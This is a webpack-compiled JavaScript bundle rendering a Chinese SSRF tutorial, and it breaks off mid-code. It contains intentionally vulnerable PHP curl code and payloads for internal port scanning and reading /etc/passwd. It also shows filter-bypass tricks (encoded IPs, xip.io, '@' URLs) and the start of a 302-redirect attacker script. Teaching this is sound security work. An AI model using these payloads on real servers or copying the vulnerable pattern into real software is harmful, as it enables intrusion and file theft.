(window.webpackJsonp=window.webpackJsonp||[]).push([[70],{811:function(t,s,a){"use strict";a.r(s);var n=a(95),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h2",{attrs:{id:"漏洞简介"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞简介"}},[t._v("#")]),t._v(" 漏洞简介")]),t._v(" "),a("p",[t._v("SSRF（Server-Side Request Forgery，服务端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）攻击者通过服务端构造恶意请求链接访问内网资源")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://gitee.com/wileysec/noteimg/raw/master/img/20200927174213.png",alt:"image-20200927174208581"}})]),t._v(" "),a("p",[t._v("攻击者可通过网站功能点存在的SSRF漏洞，作为跳板发起恶意请求访问内网资源")]),t._v(" "),a("h2",{attrs:{id:"漏洞原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞原理"}},[t._v("#")]),t._v(" 漏洞原理")]),t._v(" "),a("p",[t._v("由于服务器端提供了一个可以访问其他服务器数据的功能，例如用户提供的URL中获取图片或者文件等，但是没有对用户提供的URL进行严格过滤和限制，则导致攻击者可以恶意构造的URL让服务器端发起请求。")]),t._v(" "),a("h2",{attrs:{id:"漏洞攻击范围"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞攻击范围"}},[t._v("#")]),t._v(" 漏洞攻击范围")]),t._v(" "),a("ul",[a("li",[t._v("扫描内网端口及内务服务Banner信息")]),t._v(" "),a("li",[t._v("读取服务器文件")]),t._v(" "),a("li",[t._v("获取内网的资产信息")]),t._v(" "),a("li",[t._v("攻击内网Web应用")]),t._v(" "),a("li",[t._v("利用内网应用漏洞Getshell")])]),t._v(" "),a("h2",{attrs:{id:"漏洞利用场景"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞利用场景"}},[t._v("#")]),t._v(" 漏洞利用场景")]),t._v(" "),a("ul",[a("li",[t._v("在线翻译")]),t._v(" "),a("li",[t._v("分享")]),t._v(" "),a("li",[t._v("订阅")]),t._v(" "),a("li",[t._v("加载远程资源")]),t._v(" "),a("li",[t._v("在线识图")]),t._v(" "),a("li",[t._v("...")])]),t._v(" "),a("p",[t._v("在由发起请求的功能点，都可能存在SSRF漏洞")]),t._v(" "),a("h2",{attrs:{id:"漏洞利用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞利用"}},[t._v("#")]),t._v(" 漏洞利用")]),t._v(" "),a("h3",{attrs:{id:"常见的ssrf利用协议"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#常见的ssrf利用协议"}},[t._v("#")]),t._v(" 常见的SSRF利用协议")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("http "),a("code",[t._v("http://127.0.0.1:22")])])]),t._v(" "),a("li",[a("p",[t._v("dict "),a("code",[t._v("dict://127.0.0.1:80")])])]),t._v(" "),a("li",[a("p",[t._v("file "),a("code",[t._v("file:///etc/passwd")])])]),t._v(" "),a("li",[a("p",[t._v("stfp")])]),t._v(" "),a("li",[a("p",[t._v("tftp")])]),t._v(" "),a("li",[a("p",[t._v("ldap")])]),t._v(" "),a("li",[a("p",[t._v("gopher")])])]),t._v(" "),a("h3",{attrs:{id:"服务端代码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#服务端代码"}},[t._v("#")]),t._v(" 服务端代码")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_init")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("CURLOPT_URL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'url'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("CURLOPT_HEADER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_exec")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_close")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br")])]),a("h3",{attrs:{id:"dict协议端口检测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#dict协议端口检测"}},[t._v("#")]),t._v(" Dict协议端口检测")]),t._v(" "),a("p",[t._v("http://localhost/ssrf1.php?url=dict://127.0.0.1:3306")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://gitee.com/wileysec/noteimg/raw/master/img/20201012164249.png",alt:"image-20201012164249591"}})]),t._v(" "),a("p",[t._v("使用 "),a("code",[t._v("dict")]),t._v(" 协议端口扫描，若端口开放有Banner信息，若没开放则没有返回信息，上图为开放了MySQL数据库3306端口")]),t._v(" "),a("h3",{attrs:{id:"file文件读取"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#file文件读取"}},[t._v("#")]),t._v(" File文件读取")]),t._v(" "),a("p",[t._v("http://localhost/ssrf1.php?url=file:///etc/passwd")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://gitee.com/wileysec/noteimg/raw/master/img/20201012172537.png",alt:"image-20201012172536985"}})]),t._v(" "),a("p",[t._v("使用 "),a("code",[t._v("file")]),t._v(" 协议读取服务器 "),a("code",[t._v("/etc/passwd")]),t._v(" 文件内容")]),t._v(" "),a("h3",{attrs:{id:"http-banner信息获取"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#http-banner信息获取"}},[t._v("#")]),t._v(" Http Banner信息获取")]),t._v(" "),a("p",[t._v("http://localhost/ssrf1.php?url=http://127.0.0.1:22")]),t._v(" "),a("p",[a("img",{attrs:{src:"https://gitee.com/wileysec/noteimg/raw/master/img/20201012171009.png",alt:"image-20201012171009401"}})]),t._v(" "),a("p",[t._v("使用 "),a("code",[t._v("http")]),t._v(" 协议请求内网地址 "),a("code",[t._v("ssh 22端口")]),t._v(" 服务，获取到Banner信息，说明该IP开放了22端口")]),t._v(" "),a("h2",{attrs:{id:"漏洞绕过方法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞绕过方法"}},[t._v("#")]),t._v(" 漏洞绕过方法")]),t._v(" "),a("h3",{attrs:{id:"检测内网ip"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#检测内网ip"}},[t._v("#")]),t._v(" 检测内网IP")]),t._v(" "),a("p",[t._v("若过滤了如下内网IP地址")]),t._v(" "),a("ul",[a("li",[t._v("192.168.0.0/16")]),t._v(" "),a("li",[t._v("10.0.0.0/8")]),t._v(" "),a("li",[t._v("172.16.0.0/12")]),t._v(" "),a("li",[t._v("127.0.0.0/8")]),t._v(" "),a("li",[t._v("0.0.0.0")])]),t._v(" "),a("p",[t._v("那么可以通过进制转换来绕过")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("八进制IP "),a("code",[t._v("0177.0.0.1")])])]),t._v(" "),a("li",[a("p",[t._v("十六进制IP "),a("code",[t._v("0x7f000001")])])]),t._v(" "),a("li",[a("p",[t._v("十进制IP "),a("code",[t._v("2130706433")])])])]),t._v(" "),a("p",[t._v("通过正则匹配不到")]),t._v(" "),a("h3",{attrs:{id:"dns解析"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#dns解析"}},[t._v("#")]),t._v(" DNS解析")]),t._v(" "),a("p",[t._v("只判断是不是内网IP也有缺陷，传入的HOST是域名形式而不是IP形式的则会绕过")]),t._v(" "),a("p",[t._v("http://xip.io 这个域名可以自定义域名解析自定义的内网IP地址上")]),t._v(" "),a("p",[t._v("例如，解析到本地127.0.0.1地址")]),t._v(" "),a("div",{staticClass:"language-powershell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-powershell"}},[a("code",[t._v("ping www"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("127"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xip"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("io\nPING www"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("127"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xip"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("io "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("127"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(": 56 "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("data")]),t._v(" bytes\n64 bytes "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" 127"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1: icmp_seq=0 ttl=64 time=0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("031 ms\n64 bytes "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" 127"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1: icmp_seq=1 ttl=64 time=0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("067 ms\n64 bytes "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" 127"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1: icmp_seq=2 ttl=64 time=0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("049 ms\n64 bytes "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" 127"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1: icmp_seq=3 ttl=64 time=0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("069 ms\n^C\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" www"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("127"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("xip"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("io ping statistics "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("\n4 packets transmitted"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" 4 packets received"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" 0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" packet loss\nround"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("trip min"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("avg"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("max"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("stddev = 0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("031"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("054"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("069"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("015 ms\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br")])]),a("p",[t._v("若想解析到内网192.168.1.1地址上，则改域名为 "),a("code",[t._v("192.168.1.1.xip.io")])]),t._v(" "),a("h3",{attrs:{id:"url解析"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#url解析"}},[t._v("#")]),t._v(" URL解析")]),t._v(" "),a("p",[t._v("后端如果对传入的URL进行解析，则可能会绕过")]),t._v(" "),a("p",[t._v("http://www.baidu.com@127.0.0.1 解析这个地址则会解析到本地127.0.0.1地址")]),t._v(" "),a("h3",{attrs:{id:"_301-302跳转"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_301-302跳转"}},[t._v("#")]),t._v(" 301/302跳转")]),t._v(" "),a("p",[t._v("这个方法绕过需要一些条件")]),t._v(" "),a("ul",[a("li",[t._v("检测参数是否为内网IP地址")]),t._v(" "),a("li",[t._v("使用了CURL方法，"),a("code",[t._v("CURLOPT_FOLLOWLOCATION")]),t._v(" 为 true，跟随跳转")])]),t._v(" "),a("p",[t._v("能利用跳转的协议")]),t._v(" "),a("ul",[a("li",[t._v("http/https")]),t._v(" "),a("li",[t._v("dict")]),t._v(" "),a("li",[t._v("gopher")])]),t._v(" "),a("h4",{attrs:{id:"服务端代码-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#服务端代码-2"}},[t._v("#")]),t._v(" 服务端代码")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("                                                                                                                                                \n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("                                                         \n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_init")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("                                                       \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("CURLOPT_URL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("                                     \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("CURLOPT_HEADER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("                                     \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_setopt")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("CURLOPT_FOLLOWLOCATION")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token boolean constant"}},[t._v("true")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('//根据服务器返回 HTTP 头中的 "Location: " 重定向 ')]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_exec")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("                                                     \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl_close")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("                                                         \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("                                                                            \n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$url")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'url'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("                                                         \n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("                                                                  \n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("curl")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$url")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br")])]),a("h4",{attrs:{id:"攻击者利用跳转的代码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻击者利用跳转的代码"}},[t._v("#")]),t._v(" 攻击者利用跳转的代码")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("  \n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$schema")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'schema'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ip")]),t._v("     "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'ip'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$port")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'port'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$query")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'query'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$schema")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"://"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$ip")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"/"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$query")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("empty")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$port")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("  \n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("header")]),a("span",{pre:!0,attrs:{class:"token 